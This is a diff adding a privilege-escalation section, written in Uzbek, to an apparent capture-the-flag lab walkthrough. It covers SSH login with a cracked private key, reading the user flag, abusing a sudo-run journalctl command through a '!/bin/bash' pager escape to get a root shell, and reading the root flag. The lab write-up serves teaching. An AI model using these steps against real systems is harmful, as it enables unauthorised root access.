@@ -83,3 +83,34 @@ john --wordlist=/usr/share/wordlists/rockyou.txt sshash
 ```  
 
 ![image](https://github.com/user-attachments/assets/b80e1f45-7ac7-4ddb-a21e-afbaca7653de)   
+
+**Privilege Escalation**   
+SSH orqali David foydalanuvchisi sifatida tizimga kiramiz:   
+```
+ssh -i id_rsa david@10.129.1.193
+```   
+Foydalanuvchi flagini o‘qiymiz:   
+```
+cat user.txt
+```    
+Root imtiyozlarini olish uchun `/bin` katalogiga o‘tib, server-stats.sh skriptini tekshiramiz. Bu skript `journalctl` buyrug‘ini `root` huquqlari bilan bajaradi.   
+```
+cd bin
+ls
+cat server-stats.sh
+```
+![image](https://github.com/user-attachments/assets/7ad8b689-fd62-452e-b39a-1101a87d9a32)   
+
+Men skriptda ko'rsatilgan buyruqni bajaraman.   
+```
+/usr/bin/sudo /usr/binjournalctl -n5 -unostromo.service
+```   
+`!/bin/bash` buyrug‘i orqali `root` shell ochamiz va root flagini olamiz:   
+
+```
+cd /root
+ls
+cat root.txt
+```
+
+![image](https://github.com/user-attachments/assets/e756f504-f36f-4ab2-bc3a-83c959201e88)
